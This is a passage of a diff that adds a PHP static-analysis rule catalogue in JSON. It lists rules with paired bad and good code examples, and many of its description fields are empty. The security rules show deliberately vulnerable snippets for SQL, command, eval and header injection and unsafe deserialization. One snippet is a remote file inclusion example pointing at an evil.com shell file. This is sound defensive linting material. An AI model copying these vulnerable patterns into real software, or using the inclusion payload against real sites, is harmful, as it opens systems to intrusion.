+        "Checks for E0014 violations"
+      ]
+    },
+    {
+      "rule_code": "E0015",
+      "title": "E0015: Lack of Cohesion of Methods (LCOM4)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0015 violations"
+      ]
+    },
+    {
+      "rule_code": "E0016",
+      "title": "E0016: Cognitive complexity",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0016 violations"
+      ]
+    },
+    {
+      "rule_code": "E0017",
+      "title": "E0017: Coupling Between Objects (CBO)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0017 violations"
+      ]
+    },
+    {
+      "rule_code": "E0018",
+      "title": "E0018: Weighted Methods per Class (WMC)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0018 violations"
+      ]
+    },
+    {
+      "rule_code": "E0019",
+      "title": "E0019: Response For a Class (RFC)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0019 violations"
+      ]
+    },
+    {
+      "rule_code": "E0002",
+      "title": "E0002: Empty catch",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "try {\n    $this->saveUser($data);\n} catch (Exception $e) {\n    // Empty catch block! Error is swallowed silently.\n}",
+      "good_example": "try {\n    $this->saveUser($data);\n} catch (DatabaseException $e) {\n    // Log the error and rethrow or handle it appropriately\n    Log::error(\"Failed to save user: \" . $e->getMessage());\n    throw new UserSaveFailedException(\"Could not save user.\", 0, $e);\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Scans `try...catch` blocks where the catch body contains no statements."
+      ]
+    },
+    {
+      "rule_code": "E0020",
+      "title": "E0020: Depth of Inheritance Tree (DIT)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0020 violations"
+      ]
+    },
+    {
+      "rule_code": "E0021",
+      "title": "E0021: Number of Children (NOC)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0021 violations"
+      ]
+    },
+    {
+      "rule_code": "E0022",
+      "title": "E0022: Afferent and Efferent Coupling (Ca/Ce)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0022 violations"
+      ]
+    },
+    {
+      "rule_code": "E0023",
+      "title": "E0023: Instability (I), Abstractness (A), Distance from Main Sequence (D)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0023 violations"
+      ]
+    },
+    {
+      "rule_code": "E0024",
+      "title": "E0024: Lines of Code (LOC) per Method",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0024 violations"
+      ]
+    },
+    {
+      "rule_code": "E0025",
+      "title": "E0025: Lines of Code (LOC) per File",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0025 violations"
+      ]
+    },
+    {
+      "rule_code": "E0026",
+      "title": "E0026: Comment Ratio",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0026 violations"
+      ]
+    },
+    {
+      "rule_code": "E0027",
+      "title": "E0027: God Class (Brain Class)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0027 violations"
+      ]
+    },
+    {
+      "rule_code": "E0028",
+      "title": "E0028: Data Class",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0028 violations"
+      ]
+    },
+    {
+      "rule_code": "E0029",
+      "title": "E0029: Class-level Fan-in / Fan-out",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0029 violations"
+      ]
+    },
+    {
+      "rule_code": "E0003",
+      "title": "E0003: Method modifiers",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "class Calculator {\n    // Missing visibility modifier\n    function add(int $a, int $b): int {\n        return $a + $b;\n    }\n}",
+      "good_example": "class Calculator {\n    public function add(int $a, int $b): int {\n        return $a + $b;\n    }\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Scans class methods for missing visibility modifiers (`public`, `protected`, `private`)."
+      ]
+    },
+    {
+      "rule_code": "E0030",
+      "title": "E0030: Cyclomatic Complexity Density",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0030 violations"
+      ]
+    },
+    {
+      "rule_code": "E0031",
+      "title": "E0031: Division by Zero",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "critical",
+      "category": "verification",
+      "what_it_checks": [
+        "Checks for E0031 violations"
+      ]
+    },
+    {
+      "rule_code": "E0032",
+      "title": "E0032: Modulo by Zero",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0032 violations"
+      ]
+    },
+    {
+      "rule_code": "E0033",
+      "title": "E0033: intdiv() by Zero",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0033 violations"
+      ]
+    },
+    {
+      "rule_code": "E0034",
+      "title": "E0034: intdiv() Overflow",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0034 violations"
+      ]
+    },
+    {
+      "rule_code": "E0035",
+      "title": "E0035: Missing Array Key",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0035 violations"
+      ]
+    },
+    {
+      "rule_code": "E0036",
+      "title": "E0036: Array Index Out of Bounds",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0036 violations"
+      ]
+    },
+    {
+      "rule_code": "E0037",
+      "title": "E0037: String Offset Out of Bounds",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0037 violations"
+      ]
+    },
+    {
+      "rule_code": "E0038",
+      "title": "E0038: Method Call on Null",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0038 violations"
+      ]
+    },
+    {
+      "rule_code": "E0039",
+      "title": "E0039: Property Access on Null",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0039 violations"
+      ]
+    },
+    {
+      "rule_code": "E0004",
+      "title": "E0004: Uppercase constants",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "define('max_retries', 3);\n\nclass Config {\n    public const timeoutSeconds = 30;\n}",
+      "good_example": "define('MAX_RETRIES', 3);\n\nclass Config {\n    public const TIMEOUT_SECONDS = 30;\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Global constants defined via `define()`.",
+        "Constants defined inside classes, interfaces, traits, and enums (`const FOO = ...`).",
+        "Verifies that constant names match their uppercase equivalent (`name == name.to_uppercase()`)."
+      ]
+    },
+    {
+      "rule_code": "E0040",
+      "title": "E0040: Return Contract Violation",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0040 violations"
+      ]
+    },
+    {
+      "rule_code": "E0041",
+      "title": "E0041: Unreachable Code",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0041 violations"
+      ]
+    },
+    {
+      "rule_code": "E0042",
+      "title": "E0042: Impossible Assertion",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0042 violations"
+      ]
+    },
+    {
+      "rule_code": "E0043",
+      "title": "E0043: Stream Resource Used After Close",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0043 violations"
+      ]
+    },
+    {
+      "rule_code": "E0044",
+      "title": "E0044: Input-Dependent Runtime Growth",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "major",
+      "category": "resource",
+      "what_it_checks": [
+        "Checks for E0044 violations"
+      ]
+    },
+    {
+      "rule_code": "E0045",
+      "title": "E0045: Input-Dependent Live-Heap Growth",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "major",
+      "category": "resource",
+      "what_it_checks": [
+        "Checks for E0045 violations"
+      ]
+    },
+    {
+      "rule_code": "E0046",
+      "title": "E0046: Input-Controlled Cardinality",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "major",
+      "category": "resource",
+      "what_it_checks": [
+        "Checks for E0046 violations"
+      ]
+    },
+    {
+      "rule_code": "E0047",
+      "title": "E0047: Resource lifecycle leak",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0047 violations"
+      ]
+    },
+    {
+      "rule_code": "E0048",
+      "title": "E0048: Unbounded direct recursion",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0048 violations"
+      ]
+    },
+    {
+      "rule_code": "E0049",
+      "title": "E0049: Invalid builtin argument",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "minor",
+      "category": "syntax",
+      "what_it_checks": [
+        "Checks for E0049 violations"
+      ]
+    },
+    {
+      "rule_code": "E0005",
+      "title": "E0005: Capitalized class name",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "class paymentProcessor {\n    // ...\n}",
+      "good_example": "class PaymentProcessor {\n    // ...\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Inspects the declaration of every PHP class.",
+        "Verifies that the first letter of the class name is uppercase (`is_uppercase()`)."
+      ]
+    },
+    {
+      "rule_code": "E0050",
+      "title": "E0050: Position check used as boolean",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "if (strpos($path, '/')) {\n    // A leading slash is at position 0, so this branch is skipped.\n}",
+      "good_example": "if (strpos($path, '/') !== false) {\n    // Found, including a match at position 0.\n}\n\nif (str_starts_with($path, '/')) {\n    // Clearer when you only care about the prefix.\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`if`, `elseif`, `while`, `do`/`while`, and `for` conditions",
+        "Negated checks such as `!strpos($haystack, $needle)`",
+        "Checks combined with `&&`, `||`, `and`, `or`, or `xor`",
+        "Checks used as a ternary condition"
+      ]
+    },
+    {
+      "rule_code": "E0051",
+      "title": "E0051: Count of a non-countable value",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "count('hello'); // TypeError\nsizeof(42);     // TypeError\ncount(null);    // TypeError",
+      "good_example": "count($items);      // $items is an array\nsizeof($collection); // $collection implements Countable\nstrlen($text);      // use strlen() for strings",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`count()` or `sizeof()` with a string literal",
+        "`count()` or `sizeof()` with an integer or float literal",
+        "`count()` or `sizeof()` with a boolean or `null` literal"
+      ]
+    },
+    {
+      "rule_code": "E0052",
+      "title": "E0052: Unchecked json_decode result",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "return json_decode($json)->name;\nreturn json_decode($json, true)[0];",
+      "good_example": "$data = json_decode($json, true, flags: JSON_THROW_ON_ERROR);\n\nreturn $data['name'];",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`json_decode($json)->property`",
+        "`json_decode($json)->method()`",
+        "`json_decode($json)[$key]`"
+      ]
+    },
+    {
+      "rule_code": "E0053",
+      "title": "E0053: Unserialize without allowed_classes",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$cart = unserialize($_COOKIE['cart']);\n$cart = unserialize($payload, []);\n$cart = unserialize($payload, ['allowed_classes' => true]);",
+      "good_example": "$cart = unserialize($payload, ['allowed_classes' => false]);\n\n$dto = unserialize($payload, [\n    'allowed_classes' => [Cart::class, CartItem::class],\n]);",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`unserialize($payload)` with no options argument",
+        "A literal options array without an `allowed_classes` key",
+        "`allowed_classes => true`, which explicitly allows every class",
+        "Named arguments such as `unserialize(data: $payload, options: [...])`"
+      ]
+    },
+    {
+      "rule_code": "E0054",
+      "title": "E0054: Dynamic variable creation",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "extract($_POST);\n\n$$name = 'value';\n${$key} = 'value';",
+      "good_example": "$name = $input['name'] ?? '';\n$email = $input['email'] ?? '';\n\nreturn compact('name', 'email');",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`extract($data)` calls",
+        "Indirect variables such as `${$name}`",
+        "Nested variables such as `$$name` and `$$$name`"
+      ]
+    },
+    {
+      "rule_code": "E0055",
+      "title": "E0055: Dynamic include or require",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "include $_GET['page'];\ninclude $base . '/bootstrap.php';",
+      "good_example": "switch ($page) {\n    case 'home':\n        include __DIR__ . '/pages/home.php';\n        break;\n\n    case 'about':\n        include __DIR__ . '/pages/about.php';\n        break;\n\n    default:\n        http_response_code(404);\n}",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "A path that is a variable, property access, array access, or function call",
+        "A concatenation where any part is dynamic",
+        "A conditional or other computed path expression"
+      ]
+    },
+    {
+      "rule_code": "E0056",
+      "title": "E0056: Weak randomness for security-sensitive value",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$token = uniqid();\n$password = password_hash(mt_rand(), PASSWORD_DEFAULT);\n$nonce = (string) rand();",
+      "good_example": "$token = bin2hex(random_bytes(32));\n$code = random_int(100000, 999999);\n$passwordHash = password_hash($password, PASSWORD_DEFAULT);",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "Weak generators: `rand()`, `mt_rand()`, `uniqid()`, `lcg_value()`,",
+        "Assignments to variables whose names look security-sensitive, such as",
+        "Values passed to `password_hash()`, `hash_hmac()`, `hash()`,"
+      ]
+    },
+    {
+      "rule_code": "E0057",
+      "title": "E0057: MD5 or SHA1 used for a password",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "return md5($password);\nreturn sha1($user->password);\nreturn hash('md5', $password);",
+      "good_example": "$hash = password_hash($password, PASSWORD_DEFAULT);\n\nif (password_verify($password, $hash)) {\n    // Password is correct.\n}",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`md5($password)` and `sha1($password)`",
+        "`hash('md5', $password)` and `hash('sha1', $password)`",
+        "Password-like variables or properties used as the hashed value"
+      ]
+    },
+    {
+      "rule_code": "E0058",
+      "title": "E0058: Cookie missing Secure or HttpOnly",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "setcookie('session', $id);\nsetcookie('session', $id, ['secure' => true]);\nsession_set_cookie_params(['httponly' => true]);",
+      "good_example": "setcookie('session', $id, [\n    'secure' => true,\n    'httponly' => true,\n    'samesite' => 'Lax',\n]);\n\nsession_set_cookie_params([\n    'secure' => true,\n    'httponly' => true,\n    'samesite' => 'Lax',\n]);",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`setcookie()` and `setrawcookie()` with missing or disabled `secure` and",
+        "`session_set_cookie_params()` with missing or disabled `secure` and",
+        "Array options, positional arguments, and named arguments",
+        "Array keys are matched case-insensitively, so both `httponly` and `httpOnly`"
+      ]
+    },
+    {
+      "rule_code": "E0059",
+      "title": "E0059: Dynamic eval or assert",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "return eval($code);\n\nassert('$value > 0');",
+      "good_example": "$callback = $handlers[$name] ?? null;\n\nif ($callback !== null) {\n    return $callback();\n}\n\nassert($value > 0);",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "Any `eval()` call",
+        "`assert()` with a string literal or string concatenation"
+      ]
+    },
+    {
+      "rule_code": "E0006",
+      "title": "E0006: Property modifiers",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "class User {\n    // Property without visibility modifier or left public\n    string $name;\n}",
+      "good_example": "class User {\n    private string $name;\n\n    public function getName(): string {\n        return $this->name;\n    }\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Scans class properties for missing visibility modifiers."
+      ]
+    },
+    {
+      "rule_code": "E0060",
+      "title": "E0060: SQL injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$id = $_GET['id'] ?? '';\n$result = mysqli_query($conn, \"SELECT * FROM users WHERE id = $id\");",
+      "good_example": "$id = $_GET['id'] ?? '';\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$id]);\n$user = $stmt->fetch();",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`mysqli_query()`, `mysqli::query()`, `pg_query()`, `pg_exec()`, `PDO::query()`, `PDO::exec()` calls",
+        "Where user input (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, etc.) is concatenated directly into the SQL string"
+      ]
+    },
+    {
+      "rule_code": "E0061",
+      "title": "E0061: Cross-Site Scripting (XSS)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "echo \"Welcome, \" . $_GET['name'];",
+      "good_example": "echo \"Welcome, \" . htmlspecialchars($_GET['name'] ?? '', ENT_QUOTES, 'UTF-8');",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`echo`, `print`, `printf()`, `vprintf()` calls that output user input directly",
+        "String concatenation involving superglobals (`$_GET`, `$_POST`, etc.) in output"
+      ]
+    },
+    {
+      "rule_code": "E0062",
+      "title": "E0062: Command injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$file = $_GET['file'] ?? '';\nsystem(\"cat $file\");",
+      "good_example": "// Avoid shell execution entirely\n$content = file_get_contents($file);\n\n// If you must use shell, validate and escape\n$allowed = ['file1.txt', 'file2.txt'];\nif (!in_array($file, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$file = escapeshellarg($file);\nsystem(\"cat $file\");",
+      "severity": "major",
+      "category": "taint",
+      "what_it_checks": [
+        "`system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_exec()` calls",
+        "Where user input is passed directly or concatenated into the command string"
+      ]
+    },
+    {
+      "rule_code": "E0063",
+      "title": "E0063: LDAP injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$username = $_GET['user'] ?? '';\n$filter = \"(uid=$username)\";\n$result = ldap_search($conn, $dn, $filter);",
+      "good_example": "$username = $_GET['user'] ?? '';\n$filter = \"(\" . ldap_escape($username, '', LDAP_ESCAPE_FILTER) . \")\";\n$result = ldap_search($conn, $dn, $filter);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`ldap_search()`, `ldap_list()`, `ldap_read()` calls where the filter contains user input without `ldap_escape()`"
+      ]
+    },
+    {
+      "rule_code": "E0064",
+      "title": "E0064: XPath injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$user = $_GET['user'] ?? '';\n$query = \"//user[login='$user']\";\n$result = $xpath->query($query);",
+      "good_example": "$user = $_GET['user'] ?? '';\n$escaped = str_replace(\"'\", \"\\\\'\", $user);\n$query = \"//user[login='$escaped']\";\n$result = $xpath->query($query);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`DOMXPath::query()`, `DOMXPath::evaluate()`, `SimpleXMLElement::xpath()` with tainted string concatenation in the XPath expression"
+      ]
+    },
+    {
+      "rule_code": "E0065",
+      "title": "E0065: NoSQL injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$username = $_GET['user'] ?? '';\n$collection->findOne(['username' => $username]);",
+      "good_example": "$username = (string)($_GET['user'] ?? '');\n$collection->findOne(['username' => $username]);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "MongoDB/PHPLIB `find()`, `findOne()`, `aggregate()` calls with tainted superglobals passed directly as query filters",
+        "`$where` clauses with string interpolation of user input"
+      ]
+    },
+    {
+      "rule_code": "E0066",
+      "title": "E0066: Header injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$url = $_GET['url'] ?? '';\nheader(\"Location: $url\");",
+      "good_example": "$url = $_GET['url'] ?? '';\n$url = str_replace([\"\\r\", \"\\n\"], \"\", $url);\nheader(\"Location: $url\");",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`header()`, `header_remove()` with tainted input",
+        "`setcookie()`, `setrawcookie()` with tainted name/value"
+      ]
+    },
+    {
+      "rule_code": "E0067",
+      "title": "E0067: Mail injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$email = $_GET['email'] ?? '';\nmail('admin@example.com', 'Contact', $body, \"From: $email\");",
+      "good_example": "$email = filter_var($_GET['email'] ?? '', FILTER_VALIDATE_EMAIL);\nif ($email === false) {\n    http_response_code(400);\n    exit;\n}\nmail('admin@example.com', 'Contact', $body, \"From: $email\");",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`mail()` with `$additional_headers` or `$subject` built from tainted input",
+        "`mb_send_mail()` with tainted headers"
+      ]
+    },
+    {
+      "rule_code": "E0068",
+      "title": "E0068: Eval injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$code = $_GET['code'] ?? '';\neval($code);",
+      "good_example": "// Never eval user input. Use a whitelist of allowed operations instead.\n$action = $_GET['action'] ?? '';\n$allowed = ['list', 'view', 'search'];\nif (!in_array($action, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n// Handle each allowed action explicitly\nswitch ($action) {\n    case 'list':\n        listItems();\n        break;\n    // ...\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`eval()` calls with tainted input",
+        "`assert()` with a string argument containing user input",
+        "`create_function()` (removed in PHP 8) with user input"
+      ]
+    },
+    {
+      "rule_code": "E0069",
+      "title": "E0069: Unsafe deserialization",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$data = $_GET['data'] ?? '';\n$result = unserialize($data);",
+      "good_example": "// Use JSON instead of PHP serialization for untrusted data\n$data = $_GET['json'] ?? '';\n$result = json_decode($data, true);\nif (json_last_error() !== JSON_ERROR_NONE) {\n    http_response_code(400);\n    exit;\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`unserialize()` calls with tainted input from `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, or `php://input`",
+        "`session_decode()` with user-controlled data"
+      ]
+    },
+    {
+      "rule_code": "E0007",
+      "title": "E0007: Method parameters count",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0007 violations"
+      ]
+    },
+    {
+      "rule_code": "E0070",
+      "title": "E0070: Remote file inclusion",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$page = $_GET['page'] ?? '';\ninclude $page; // ?page=http://evil.com/shell.txt",
+      "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude __DIR__ . \"/pages/$page.php\";",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`include`, `require`, `include_once`, `require_once` where the path is built from user-controlled input",
+        "`file_get_contents()`, `readfile()`, `fopen()` with user-controlled file paths from remote sources"
+      ]
+    },
+    {
+      "rule_code": "E0071",
+      "title": "E0071: Unsafe file upload",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $_FILES['file']['name']);",
+      "good_example": "$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$finfo = new finfo(FILEINFO_MIME_TYPE);\n$mime = $finfo->file($_FILES['file']['tmp_name']);\nif (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'], true)) {\n    http_response_code(400);\n    exit;\n}\n$filename = bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], '/var/www/protected_uploads/' . $filename);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`move_uploaded_file()` without prior extension/MIME validation",
+        "`file_put_contents()` with `$_FILES` data",
+        "`$_FILES['name']` used directly in file paths without sanitization"
+      ]
+    },
+    {
+      "rule_code": "E0072",
+      "title": "E0072: Path traversal",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$page = $_GET['page'] ?? '';\ninclude __DIR__ . '/pages/' . $page . '.php';",
+      "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude __DIR__ . '/pages/' . $page . '.php';",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`include`, `require`, `file_get_contents()`, `file_put_contents()`, `fopen()` with paths built from tainted input",
+        "`../` or null byte (`%00`) sequences in user-controlled paths"
+      ]
+    },
+    {
+      "rule_code": "E0073",
+      "title": "E0073: Weak cryptographic hash",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$hash = md5($password);   // weak and fast\n$hash = sha1($password);  // weak and fast",
+      "good_example": "$hash = password_hash($password, PASSWORD_DEFAULT);\n// Uses bcrypt or argon2 with automatic salting and cost factor\nif (password_verify($password, $hash)) {\n    // valid\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`md5()`, `sha1()`, `hash('md5', ...)`, `hash('sha1', ...)` applied to password-like variables",
+        "`crypt()` without a proper salt or cost parameter"
+      ]
+    },
+    {
+      "rule_code": "E0074",
+      "title": "E0074: Weak random number generator",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$token = bin2hex(mt_rand(100000, 999999)); // predictable\n$key = rand(1000, 9999);                    // easily brute-forced",
+      "good_example": "$token = bin2hex(random_bytes(16));  // cryptographically secure\n$key = random_int(1000, 9999);       // cryptographically secure",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`rand()`, `mt_rand()`, `uniqid()` used for security-sensitive purposes (tokens, keys, salts)",
+        "`mt_rand()` without seeding from a secure source"
+      ]
+    },
+    {
+      "rule_code": "E0075",
+      "title": "E0075: Session security",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "session_set_cookie_params([\n    'secure' => false,    // sent over HTTP\n    'httponly' => false,  // accessible via JavaScript\n]);\nsession_start();",
+      "good_example": "session_set_cookie_params([\n    'lifetime' => 3600,\n    'path' => '/',\n    'secure' => true,      // HTTPS only\n    'httponly' => true,    // not accessible via JavaScript\n    'samesite' => 'Lax',   // prevent cross-site leakage\n]);\nini_set('session.use_strict_mode', '1');\nsession_start();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`session_start()` without prior `session_set_cookie_params()` setting `secure => true` and `httponly => true`",
+        "`ini_set('session.cookie_secure', '0')` or `ini_set('session.cookie_httponly', '0')`",
+        "`session.use_trans_sid = 1` (session ID in URL)"
+      ]
+    },
+    {
+      "rule_code": "E0076",
+      "title": "E0076: Information disclosure",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "<?php phpinfo(); ?>",
+      "good_example": "// Remove phpinfo() entirely from production code\n// Use it only in local development, never commit it",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`phpinfo()` function calls anywhere in committed source code",
